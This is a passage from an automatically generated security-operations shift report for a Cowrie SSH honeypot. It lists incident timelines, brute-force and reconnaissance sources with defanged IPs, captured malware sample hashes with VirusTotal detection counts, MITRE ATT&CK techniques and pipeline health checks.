| `2026-05-31 20:52:20` | `cowrie.command.failed` |
| `2026-05-31 20:52:20` | `cowrie.log.closed` |
| `2026-05-31 20:52:21` | `cowrie.session.params` |
| `2026-05-31 20:52:21` | `cowrie.command.input` |
| `2026-05-31 20:52:21` | `cowrie.session.file_download` |
| `2026-05-31 20:52:21` | `cowrie.log.closed` |
| `2026-05-31 20:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.26[.]93` to AbuseIPDB if not already reported
- [ ] Block `101.126.26[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b95d78b287c4

| Field | Detail |
|---|---|
| **Source IP** | `101.126.26[.]93` |
| **First Seen** | 2026-05-31 20:52 |
| **Last Seen** | 2026-05-31 20:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:52:24` | `cowrie.session.connect` |
| `2026-05-31 20:52:24` | `cowrie.client.version` |
| `2026-05-31 20:52:24` | `cowrie.client.kex` |
| `2026-05-31 20:52:26` | `cowrie.login.success` |
| `2026-05-31 20:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.26[.]93` to AbuseIPDB if not already reported
- [ ] Block `101.126.26[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `159.203.20[.]239` | **18** | 2026-05-31 19:22 | 2026-05-31 20:59 | 14m | 0 | `T1592` | 🟠 MEDIUM |
| `101.126.26[.]93` | **15** | 2026-05-31 20:13 | 2026-05-31 20:54 | 14m | 6 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `114.141.59[.]195` | **10** | 2026-05-31 19:42 | 2026-05-31 20:37 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.31.95[.]163` | **9** | 2026-05-31 19:36 | 2026-05-31 19:59 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `115.191.2[.]208` | 1 | 2026-05-31 20:23 | 2026-05-31 20:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-05-31 20:48 | 2026-05-31 20:48 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.29.240[.]154` | 1 | 2026-05-31 20:18 | 2026-05-31 20:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `154.57.216[.]142` | 1 | 2026-05-31 20:17 | 2026-05-31 20:17 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `165.22.57[.]22` | 1 | 2026-05-31 20:59 | 2026-05-31 21:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.115.87[.]134` | 1 | 2026-05-31 20:22 | 2026-05-31 20:22 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.184.84[.]77` | 1 | 2026-05-31 20:13 | 2026-05-31 20:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `187.108.193[.]54` | 1 | 2026-05-31 19:52 | 2026-05-31 19:53 | 31s | 0 | `T1592` | 🟢 LOW |
| `213.166.84[.]59` | 1 | 2026-05-31 20:08 | 2026-05-31 20:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.202.9[.]133` | 1 | 2026-05-31 19:53 | 2026-05-31 19:54 | 40s | 0 | `T1592` | 🟢 LOW |
| `91.142.209[.]147` | 1 | 2026-05-31 20:42 | 2026-05-31 20:43 | 38s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 0/100 | 🟢 LOW | Not in VT |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `91.142.209[.]147` | ES | AXARNET COMUNICACIONES, S.L. | **100** ⚠️ | 0 |
| `187.108.193[.]54` | BR | EVEO S.A. | **100** ⚠️ | 10 |
| `114.141.59[.]195` | ID | PT. Sukma Sejati Media | **100** ⚠️ | 33 |
| `213.166.84[.]59` | GB | Infrawatch Limited | **100** ⚠️ | 12 |
| `159.203.20[.]239` | CA | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `139.19.117[.]130` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `175.115.87[.]134` | KR | SK Broadband Co Ltd | **100** ⚠️ | 11 |
| `35.202.9[.]133` | US | Google LLC | **100** ⚠️ | 50 |
| `154.57.216[.]142` | PK | Cogent Communications, LLC | **100** ⚠️ | 50 |
| `165.22.57[.]22` | SG | DigitalOcean, LLC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 60 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 28 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 28 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 15 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 24 below threshold 25 | 2 |
| AbuseIPDB score 8 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 94 cases |
| Tool 34  | Credential Extractor        | ✅ 57 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 19 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (3.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 16 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 28 priority case(s) shown individually · 15 recon entry/entries in table (4 group(s) consolidating 52 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-31T21:04:02Z_
